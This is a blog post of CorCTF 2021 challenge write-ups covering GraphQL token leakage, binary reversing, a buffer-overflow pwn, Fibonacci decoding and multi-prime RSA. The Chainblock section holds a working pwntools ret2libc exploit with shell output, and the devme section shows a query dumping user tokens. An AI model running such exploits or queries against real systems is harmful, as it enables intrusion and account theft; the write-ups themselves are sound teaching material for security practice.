---
title: "CorCTF 2021 Writeups"
date: 2021-08-23T15:36:51+07:00
draft: false
iscjklanguage: false
isarchived: false
categories: ["CTF"]
images: ["https://images.unsplash.com/photo-1501139083538-0139583c060f?w=1920&q=50"]
aliases: []
description: "Writeup of CorCTF 2021"
summary: "Writeup of CorCTF 2021"
---


# devme

>
> an ex-google, ex-facebook tech lead recommended me this book!
>
> [https://devme.be.ax](https://devme.be.ax/)



No source code attached, so i try to test the feature one by one. After few second, i've found that the sign up (located at bottom home page) is sending graphql query into https://devme.be.ax/graphql. Since we know that graphql is provided of introspection query by default (cmiiw), we can use GraphiQL tools  [Here](https://www.electronjs.org/apps/graphiql). 



After inserting endpoint, check the documentation explorer for the **query** and **mutation**. In **query** section you will find out users and flag field. Lets check **user** first.

**Request**

```
query{
  users{
    token,
    username
  }
}
```

**Response**

```
{
  "data": {
    "users": [
      {
        "token": "3cd3a50e63b3cb0a69cfb7d9d4f0ebc1dc1b94143475535930fa3db6e687280b",
        "username": "admin"
      },
      .......
```



 Now lets use the token to retreive flag from user admin.



**Request**

```
query{
  flag(token: "3cd3a50e63b3cb0a69cfb7d9d4f0ebc1dc1b94143475535930fa3db6e687280b")
}
```



**Response**

```
{
  "data": {
    "flag": "corctf{ex_g00g13_3x_fac3b00k_t3ch_l3ad_as_a_s3rvice}"
  }
}
```



**FLAG:** corctf{ex_g00g13_3x_fac3b00k_t3ch_l3ad_as_a_s3rvice}





# babyrev

> well uh... this is what you get when you make your web guy make a rev chall



given 1 ELF binary file, lets open it on IDA.

**main()**

~~~c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char j; // al
  int i; // [rsp+8h] [rbp-F8h]
  int v6; // [rsp+Ch] [rbp-F4h]
  size_t v7; // [rsp+10h] [rbp-F0h]
  size_t n; // [rsp+18h] [rbp-E8h]
  char s[64]; // [rsp+20h] [rbp-E0h] BYREF
  char dest[64]; // [rsp+60h] [rbp-A0h] BYREF
  char s1[72]; // [rsp+A0h] [rbp-60h] BYREF
  unsigned __int64 v12; // [rsp+E8h] [rbp-18h]

  v12 = __readfsqword(0x28u);
  fgets(s, 64, stdin);
  s[strcspn(s, "\n")] = 0;
  v7 = strlen(s);
  n = 7LL;
  if ( strncmp("corctf{", s, 7uLL) )
    goto LABEL_12;
  if ( s[v7 - 1] != 125 )
    goto LABEL_12;
  if ( v7 != 28 )
    goto LABEL_12;
  memcpy(dest, &s[n], 28 - n - 1);
  dest[28 - n - 1] = 0;
  for ( i = 0; i < strlen(dest); ++i )
  {
    v6 = 4 * i;
    for ( j = is_prime(4 * i); j != 1; j = is_prime(v6) )
      ++v6;
    s1[i] = rot_n(dest[i], v6);
  }
  s1[strlen(s1) + 1] = 0;
  memfrob(check, 0x14uLL);
  if ( !strcmp(s1, check) )
  {
    puts("correct!");
    return 0;
  }
  else
  {
LABEL_12:
    puts("rev is hard i guess...");
    return 1;
  }
}
~~~

From the code above, we know that the flag length is **28**, start with **corctf{** and end with **}**. The program create loop and check the iterator is prime or not using **is_prime()** function and if some condition are true our input will be passed into **rot_n()** function. 



I very curious about the this code below, so i decided to debug it with gdb

~~~c
memfrob(check, 0x14uLL);
  if ( !strcmp(s1, check) )
  {
    puts("correct!");
    return 0;
  }
~~~

```
 ► 0x55555555558d <main+479>    call   strcmp@plt                <strcmp@plt>
        s1: 0x7fffffffdcf0 ◂— 0x444458524e4c4643 ('CFLNRXDD')
        s2: 0x555555558010 (check) ◂— 'ujp?_oHy_lxiu_zx_uve'
```

We got encoded flag here, ujp?_oHy_lxiu_zx_uve. Now lets explore another function in IDA

**rot_n()**

~~~c
__int64 __fastcall rot_n(unsigned __int8 a1, int a2)
{
  if ( strchr(ASCII_UPPER, (char)a1) )
    return (unsigned __int8)ASCII_UPPER[(a2 + (char)a1 - 65) % 26];
  if ( strchr(ASCII_LOWER, (char)a1) )
    return (unsigned __int8)ASCII_LOWER[(a2 + (char)a1 - 97) % 26];
  return a1;
}
~~~



**is_prime()**

~~~c
__int64 __fastcall is_prime(int a1)
{
  int i; // [rsp+1Ch] [rbp-4h]

  if ( a1 <= 1 )
    return 0LL;
  for ( i = 2; i <= (int)sqrt((double)a1); ++i )
  {
    if ( !(a1 % i) )
      return 0LL;
  }
  return 1LL;
}
~~~



At the first place, i dont know what the result of this loop at **main()**

~~~c
for ( j = is_prime(4 * i); j != 1; j = is_prime(v6) )
      ++v6;
~~~

so i decided to create c source code that implement the code all above.

**loop.c**

~~~C
#include <stdio.h>
#include <math.h>
#include <string.h>

// gcc loop.c -o loop -lm

int is_prime(int a1){
  int i;
  if ( a1 <= 1 )
    return 0;
  for ( i = 2; i <= sqrt(a1); ++i )
  {
    if ( !(a1 % i) )
      return 0;
  }
  return 1;
}



int main(int argc, char const *argv[])
{
	char flag[] = "ujp?_oHy_lxiu_zx_uve";
	int v6;
	for ( int i = 0; i < strlen(flag); ++i ){
	    v6 = 4 * i;
	    for ( int j = is_prime(4 * i); j != 1; j = is_prime(v6) )
	      ++v6;
	  	printf("%d ", v6);	    
	}
}
~~~

```
➜  babyrev git:(master) ✗ gcc loop.c -o loop -lm
➜  babyrev git:(master) ✗ ./loop
2 5 11 13 17 23 29 29 37 37 41 47 53 53 59 61 67 71 73 79
```

After knew what those loop does, i create python script to reverse the rot value.

**solver.py**

~~~python
#!/usr/bin/env python3
from string import ascii_lowercase, ascii_uppercase
def rot_n(a1, a2):
    ASCII_UPPER = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    ASCII_LOWER = "abcdefghijklmnopqrstuvwxyz"
    if ( chr(a1) in ASCII_UPPER):
        return ASCII_UPPER[(a2 + a1 - 65) % 26];
    if ( chr(a1) in ASCII_LOWER):
        return ASCII_LOWER[(a2 + a1 - 97) % 26];
    return chr(a1);

def main():
    flag = "ujp?_oHy_lxiu_zx_uve"
    prime = [2,5,11,13,17,23,29,29,37,37,41,47,53,53,59,61,67,71,73,79]
    for idx, val in enumerate(prime):
        print(rot_n(ord(flag[idx]), -val), end="")

if __name__ == '__main__':
    main()
~~~

```
➜  babyrev git:(master) ✗ python3 solve.py
see?_rEv_aint_so_bad
```



**FLAG:** corctf{see?_rEv_aint_so_bad}





# Chainblock

> I made a chain of blocks!
>
> nc pwn.be.ax 5000



There are few files that we get, library, binary and source code of binary itself. 

~~~C
#include <stdio.h>

char* name = "Techlead";
int balance = 100000000;

void verify() {
	char buf[255];
	printf("Please enter your name: ");
	gets(buf);

	if (strcmp(buf, name) != 0) {
		printf("KYC failed, wrong identity!\n");
		return;
	}

	printf("Hi %s!\n", name);
	printf("Your balance is %d chainblocks!\n", balance);
}

int main() {
	setvbuf(stdout, NULL, _IONBF, 0);

	printf("      ___           ___           ___                       ___     \n");
	printf("     /\\  \\         /\\__\\         /\\  \\          ___        /\\__\\    \n");
	printf("    /::\\  \\       /:/  /        /::\\  \\        /\\  \\      /::|  |   \n");
	printf("   /:/\\:\\  \\     /:/__/        /:/\\:\\  \\       \\:\\  \\    /:|:|  |   \n");
	printf("  /:/  \\:\\  \\   /::\\  \\ ___   /::\\~\\:\\  \\      /::\\__\\  /:/|:|  |__ \n");
	printf(" /:/__/ \\:\\__\\ /:/\\:\\  /\\__\\ /:/\\:\\ \\:\\__\\  __/:/\\/__/ /:/ |:| /\\__\\\n");
	printf(" \\:\\  \\  \\/__/ \\/__\\:\\/:/  / \\/__\\:\\/:/  / /\\/:/  /    \\/__|:|/:/  /\n");
	printf("  \\:\\  \\            \\::/  /       \\::/  /  \\::/__/         |:/:/  / \n");
	printf("   \\:\\  \\           /:/  /        /:/  /    \\:\\__\\         |::/  /  \n");
	printf("    \\:\\__\\         /:/  /        /:/  /      \\/__/         /:/  /   \n");
	printf("     \\/__/         \\/__/         \\/__/                     \\/__/    \n");
	printf("      ___           ___       ___           ___           ___     \n");
	printf("     /\\  \\         /\\__\\     /\\  \\         /\\  \\         /\\__\\    \n");
	printf("    /::\\  \\       /:/  /    /::\\  \\       /::\\  \\       /:/  /    \n");
	printf("   /:/\\:\\  \\     /:/  /    /:/\\:\\  \\     /:/\\:\\  \\     /:/__/     \n");
	printf("  /::\\~\\:\\__\\   /:/  /    /:/  \\:\\  \\   /:/  \\:\\  \\   /::\\__\\____ \n");
	printf(" /:/\\:\\ \\:|__| /:/__/    /:/__/ \\:\\__\\ /:/__/ \\:\\__\\ /:/\\:::::\\__\\\n");
	printf(" \\:\\~\\:\\/:/  / \\:\\  \\    \\:\\  \\ /:/  / \\:\\  \\  \\/__/ \\/_|:|~~|~   \n");
	printf("  \\:\\ \\::/  /   \\:\\  \\    \\:\\  /:/  /   \\:\\  \\          |:|  |    \n");
	printf("   \\:\\/:/  /     \\:\\  \\    \\:\\/:/  /     \\:\\  \\         |:|  |    \n");
	printf("    \\::/__/       \\:\\__\\    \\::/  /       \\:\\__\\        |:|  |    \n");
	printf("     ~~            \\/__/     \\/__/         \\/__/         \\|__|    \n");
	printf("\n\n");
	printf("----------------------------------------------------------------------------------");
	printf("\n\n");

	printf("Welcome to Chainblock, the world's most advanced chain of blocks.\n\n");

	printf("Chainblock is a unique company that combines cutting edge cloud\n");
	printf("technologies with high tech AI powered machine learning models\n");
	printf("to create a unique chain of blocks that learns by itself!\n\n");

	printf("Chainblock is also a highly secure platform that is unhackable by design.\n");
	printf("We use advanced technologies like NX bits and anti-hacking machine learning models\n");
	printf("to ensure that your money is safe and will always be safe!\n\n");

	printf("----------------------------------------------------------------------------------");
	printf("\n\n");

	printf("For security reasons we require that you verify your identity.\n");

	verify();
}
~~~



As you can see above, this is a classic buffer overflow vulnerability because of using malicious function **gets()**. 

Now lets checksec the binary

```
➜  chainblock git:(master) ✗ checksec chainblock 
[*] '/home/syahrul/Desktop/Writeups/corCTF_2021/pwn/chainblock/chainblock'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  './'
➜  chainblock git:(master) ✗ ldd chainblock
	linux-vdso.so.1 (0x00007ffce2ffe000)
	libc.so.6 => ./libc.so.6 (0x00007f765559d000)
	./ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007f765578b000)
```

With minimal security mechanism in binary, we can do technique called ret2libc. The idea is, first we need to leak the base address and send one gadget payload into that binary.

**solver.py**

~~~python
from pwn import *

# f = process("./chainblock")
elf = ELF("./chainblock")
libc = ELF("./libc.so.6")
rop = ROP("./chainblock")

f = remote("pwn.be.ax",5000)

pop_rdi_ret = (rop.find_gadget(['pop rdi', 'ret']))[0]
main = elf.symbols['main']
puts = elf.plt['puts']
got = elf.got['puts']

payload = ""
payload += "A"*264
payload += p64(pop_rdi_ret)
payload += p64(got)
payload += p64(puts)
payload += p64(main)

if len(sys.argv) > 2:
	gdb.attach(f, "b *main+484\nc")

f.sendline(payload)
f.recvuntil("wrong identity!")
f.recvline()

leak = f.recvline().strip()
leak = leak.ljust(8, "\x00")
leak = u64(leak)

base_addr = leak - libc.symbols['puts']

one_gadget = base_addr + 0xde78f

log.info("puts() at : " + str(hex(leak)))
log.info("libc base @ %s" % hex(base_addr))



payload = ""
payload += "A"*264
payload += p64(one_gadget)
f.sendline(payload)

f.interactive()
~~~

```
➜  chainblock git:(master) ✗ python solver.py 
[*] '/home/syahrul/Desktop/Writeups/corCTF_2021/pwn/chainblock/chainblock'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  './'
[*] '/home/syahrul/Desktop/Writeups/corCTF_2021/pwn/chainblock/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 14 cached gadgets for './chainblock'
[+] Opening connection to pwn.be.ax on port 5000: Done
[*] puts() at : 0x7efe685919d0
[*] libc base @ 0x7efe68511000
[*] Switching to interactive mode
      ___           ___           ___                       ___     
     /\  \         /\__\         /\  \          ___        /\__\    
    /::\  \       /:/  /        /::\  \        /\  \      /::|  |   
   /:/\:\  \     /:/__/        /:/\:\  \       \:\  \    /:|:|  |   
  /:/  \:\  \   /::\  \ ___   /::\~\:\  \      /::\__\  /:/|:|  |__ 
 /:/__/ \:\__\ /:/\:\  /\__\ /:/\:\ \:\__\  __/:/\/__/ /:/ |:| /\__\
 \:\  \  \/__/ \/__\:\/:/  / \/__\:\/:/  / /\/:/  /    \/__|:|/:/  /
  \:\  \            \::/  /       \::/  /  \::/__/         |:/:/  / 
   \:\  \           /:/  /        /:/  /    \:\__\         |::/  /  
    \:\__\         /:/  /        /:/  /      \/__/         /:/  /   
     \/__/         \/__/         \/__/                     \/__/    
      ___           ___       ___           ___           ___     
     /\  \         /\__\     /\  \         /\  \         /\__\    
    /::\  \       /:/  /    /::\  \       /::\  \       /:/  /    
   /:/\:\  \     /:/  /    /:/\:\  \     /:/\:\  \     /:/__/     
  /::\~\:\__\   /:/  /    /:/  \:\  \   /:/  \:\  \   /::\__\____ 
 /:/\:\ \:|__| /:/__/    /:/__/ \:\__\ /:/__/ \:\__\ /:/\:::::\__\
 \:\~\:\/:/  / \:\  \    \:\  \ /:/  / \:\  \  \/__/ \/_|:|~~|~   
  \:\ \::/  /   \:\  \    \:\  /:/  /   \:\  \          |:|  |    
   \:\/:/  /     \:\  \    \:\/:/  /     \:\  \         |:|  |    
    \::/__/       \:\__\    \::/  /       \:\__\        |:|  |    
     ~~            \/__/     \/__/         \/__/         \|__|    


----------------------------------------------------------------------------------

Welcome to Chainblock, the world's most advanced chain of blocks.

Chainblock is a unique company that combines cutting edge cloud
technologies with high tech AI powered machine learning models
to create a unique chain of blocks that learns by itself!

Chainblock is also a highly secure platform that is unhackable by design.
We use advanced technologies like NX bits and anti-hacking machine learning models
to ensure that your money is safe and will always be safe!

----------------------------------------------------------------------------------

For security reasons we require that you verify your identity.
Please enter your name: KYC failed, wrong identity!
$ cat flag.txt
corctf{mi11i0nt0k3n_1s_n0t_a_scam_r1ght}$
```

**FLAG:** corctf{mi11i0nt0k3n_1s_n0t_a_scam_r1ght}





# Fibinary

> Warmup your crypto skills with the superior number system!

Given 2 files, enc.py and flag.enc. From the name we know that the flag is encrypted using python script. So, lets look into enc.py and flag.enc



**flag.enc**

```
10000100100 10010000010 10010001010 10000100100 10010010010 10001000000 10100000000 10000100010 00101010000 10010010000 00101001010 10000101000 10000010010 00101010000 10010000000 10000101000 10000010010 10001000000 00101000100 10000100010 10010000100 00010101010 00101000100 00101000100 00101001010 10000101000 10100000100 00000100100
```

**enc.py**

~~~python
fib = [1, 1]
for i in range(2, 11):
	fib.append(fib[i - 1] + fib[i - 2])

def c2f(c):
	n = ord(c)
	b = ''
	for i in range(10, -1, -1):
		if n >= fib[i]:
			n -= fib[i]
			b += '1'
		else:
			b += '0'
	return b

flag = open('flag.txt', 'r').read()
enc = ''
for c in flag:
	enc += c2f(c) + ' '
with open('flag.enc', 'w') as f:
	f.write(enc.strip())
~~~



The interesting code is

~~~python
flag = open('flag.txt', 'r').read()
enc = ''
for c in flag:
	enc += c2f(c) + ' '
~~~



By looking at the piece above, we know that our flag is encrypted using c2f() per character. Therefore, we dont need to understanding what the c2f() function does. We just need brute force the flag by generating all ascii character and pass it into c2f() function. And then we can replace encrypted flag with our ascii value. 

**solver.py**

~~~python
import string


charlist = list(string.printable)

fib = [1, 1]
for i in range(2, 11):
	fib.append(fib[i - 1] + fib[i - 2])

def c2f(c):
	n = ord(c)
	b = ''
	for i in range(10, -1, -1):
		if n >= fib[i]:
			n -= fib[i]
			b += '1'
		else:
			b += '0'
	return b


enc_charlist = [c2f(i) for i in charlist]
charlist = dict(zip(charlist, enc_charlist))

with open("flag.enc") as enc:
	flag = enc.read()
	for k, v in charlist.items():
		flag = flag.replace(v, k)
	print(flag)
~~~



**FLAG:** corctf{b4s3d_4nd_f1bp!113d}





# 4096

> I heard 4096 bit RSA is secure, so I encrypted the flag with it.



Given 2 files source.py and output.txt

**output.txt**

```
50630448182626893495464810670525602771527685838257974610483435332349728792396826591558947027657819590790590829841808151825744184405725893984330719835572507419517069974612006826542638447886105625739026433810851259760829112944769101557865474935245672310638931107468523492780934936765177674292815155262435831801499197874311121773797041186075024766460977392150443756520782067581277504082923534736776769428755807994035936082391356053079235986552374148782993815118221184577434597115748782910244569004818550079464590913826457003648367784164127206743005342001738754989548942975587267990706541155643222851974488533666334645686774107285018775831028090338485586011974337654011592698463713316522811656340001557779270632991105803230612916547576906583473846558419296181503108603192226769399675726201078322763163049259981181392937623116600712403297821389573627700886912737873588300406211047759637045071918185425658854059386338495534747471846997768166929630988406668430381834420429162324755162023168406793544828390933856260762963763336528787421503582319435368755435181752783296341241853932276334886271511786779019664786845658323166852266264286516275919963650402345264649287569303300048733672208950281055894539145902913252578285197293
15640629897212089539145769625632189125456455778939633021487666539864477884226491831177051620671080345905237001384943044362508550274499601386018436774667054082051013986880044122234840762034425906802733285008515019104201964058459074727958015931524254616901569333808897189148422139163755426336008738228206905929505993240834181441728434782721945966055987934053102520300610949003828413057299830995512963516437591775582556040505553674525293788223483574494286570201177694289787659662521910225641898762643794474678297891552856073420478752076393386273627970575228665003851968484998550564390747988844710818619836079384152470450659391941581654509659766292902961171668168368723759124230712832393447719252348647172524453163783833358048230752476923663730556409340711188698221222770394308685941050292404627088273158846156984693358388590950279445736394513497524120008211955634017212917792675498853686681402944487402749561864649175474956913910853930952329280207751998559039169086898605565528308806524495500398924972480453453358088625940892246551961178561037313833306804342494449584581485895266308393917067830433039476096285467849735814999851855709235986958845331235439845410800486470278105793922000390078444089105955677711315740050638
```



**source.py**

~~~python
from Crypto.Util.number import getPrime, bytes_to_long
from private import flag

def prod(lst):
	ret = 1
	for num in lst:
		ret *= num
	return ret

m = bytes_to_long(flag)
primes = [getPrime(32) for _ in range(128)]
n = prod(primes)
e = 65537
print(n)
print(pow(m, e, n))
~~~



From the code above, we know that this is classic RSA task. And the first line of output.txt is **n** and the second line is **c**. After doing some google search, i've found that this is multi prime RSA task and ive found solver script as well in [Here](https://gist.github.com/jackz314/09cf253d3451f169c2dbb6bbfed73782). We just need to find the factor **n** using ~~sage from valorant~~ sagemath

~~~python
➜  4096 git:(master) ✗ sage
┌────────────────────────────────────────────────────────────────────┐
│ SageMath version 9.0, Release Date: 2020-01-01                     │
│ Using Python 3.8.10. Type "help()" for help.                       │
└────────────────────────────────────────────────────────────────────┘
sage: list(factor(50630448182.....97293))
    
[(2148630611, 1),
 (2157385673, 1),
 (2216411683, 1),
 (2223202649, 1),
 (2230630973, 1),
 ......
 (4276173893, 1)]
~~~

then copy the list of factor into solver script.

**solver.py**

~~~python
#!/usr/bin/env python2.7

primes = [2148630611, 2157385673, 2216411683, 2223202649, 2230630973, 2240170147, 2278427881, 2293226687, 2322142411, 2365186141, 2371079143, 2388797093, 2424270803, 2436598001, 2444333767, 2459187103, 2491570349, 2510750149, 2525697263, 2572542211, 2575495753, 2602521199, 2636069911, 2647129697, 2657405087, 2661720221, 2672301743, 2682518317, 2695978183, 2703629041, 2707095227, 2710524571, 2719924183, 2724658201, 2733527227, 2746638019, 2752963847, 2753147143, 2772696307, 2824169389, 2841115943, 2854321391, 2858807113, 2932152359, 2944722127, 2944751701, 2949007619, 2959325459, 2963383867, 3012495907, 3013564231, 3035438359, 3056689019, 3057815377, 3083881387, 3130133681, 3174322859, 3177943303, 3180301633, 3200434847, 3228764447, 3238771411, 3278196319, 3279018511, 3285444073, 3291377941, 3303691121, 3319529377, 3335574511, 3346647649, 3359249393, 3380851417, 3398567593, 3411506629, 3417563069, 3453863503, 3464370241, 3487902133, 3488338697, 3522596999, 3539958743, 3589083991, 3623581037, 3625437121, 3638373857, 3646337561, 3648309311, 3684423151, 3686523713, 3716991893, 3721186793, 3760232953, 3789253133, 3789746923, 3811207403, 3833706949, 3833824031, 3854175641, 3860554891, 3861767519, 3865448239, 3923208001, 3941016503, 3943871257, 3959814431, 3961738709, 3978832967, 3986329331, 3991834969, 3994425601, 4006267823, 4045323871, 4056085883, 4073647147, 4091945483, 4098491081, 4135004413, 4140261491, 4141964923, 4152726959, 4198942673, 4205028467, 4218138251, 4227099257, 4235456317, 4252196909, 4270521797, 4276173893]
e = 65537
c = 15640629897212089539145769625632189125456455778939633021487666539864477884226491831177051620671080345905237001384943044362508550274499601386018436774667054082051013986880044122234840762034425906802733285008515019104201964058459074727958015931524254616901569333808897189148422139163755426336008738228206905929505993240834181441728434782721945966055987934053102520300610949003828413057299830995512963516437591775582556040505553674525293788223483574494286570201177694289787659662521910225641898762643794474678297891552856073420478752076393386273627970575228665003851968484998550564390747988844710818619836079384152470450659391941581654509659766292902961171668168368723759124230712832393447719252348647172524453163783833358048230752476923663730556409340711188698221222770394308685941050292404627088273158846156984693358388590950279445736394513497524120008211955634017212917792675498853686681402944487402749561864649175474956913910853930952329280207751998559039169086898605565528308806524495500398924972480453453358088625940892246551961178561037313833306804342494449584581485895266308393917067830433039476096285467849735814999851855709235986958845331235439845410800486470278105793922000390078444089105955677711315740050638
n = 50630448182626893495464810670525602771527685838257974610483435332349728792396826591558947027657819590790590829841808151825744184405725893984330719835572507419517069974612006826542638447886105625739026433810851259760829112944769101557865474935245672310638931107468523492780934936765177674292815155262435831801499197874311121773797041186075024766460977392150443756520782067581277504082923534736776769428755807994035936082391356053079235986552374148782993815118221184577434597115748782910244569004818550079464590913826457003648367784164127206743005342001738754989548942975587267990706541155643222851974488533666334645686774107285018775831028090338485586011974337654011592698463713316522811656340001557779270632991105803230612916547576906583473846558419296181503108603192226769399675726201078322763163049259981181392937623116600712403297821389573627700886912737873588300406211047759637045071918185425658854059386338495534747471846997768166929630988406668430381834420429162324755162023168406793544828390933856260762963763336528787421503582319435368755435181752783296341241853932276334886271511786779019664786845658323166852266264286516275919963650402345264649287569303300048733672208950281055894539145902913252578285197293

def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception('modular inverse does not exist')
    else:
        return x % m

ts = []
xs = []
ds = []

for i in range(len(primes)):
    ds.append(modinv(e, primes[i]-1))

m = primes[0]

for i in range(1, len(primes)):
    ts.append(modinv(m, primes[i]))
    m = m * primes[i]

for i in range(len(primes)):
    xs.append(pow((c%primes[i]), ds[i], primes[i]))

x = xs[0]
m = primes[0]

for i in range(1, len(primes)):
    x = x + m * ((xs[i] - x % primes[i]) * (ts[i-1] % primes[i]))
    m = m * primes[i]


print hex(x%n)[2:-1].decode("hex")
~~~



**FLAG:** corctf{to0_m4ny_pr1m3s55_63aeea37a6b3b22f}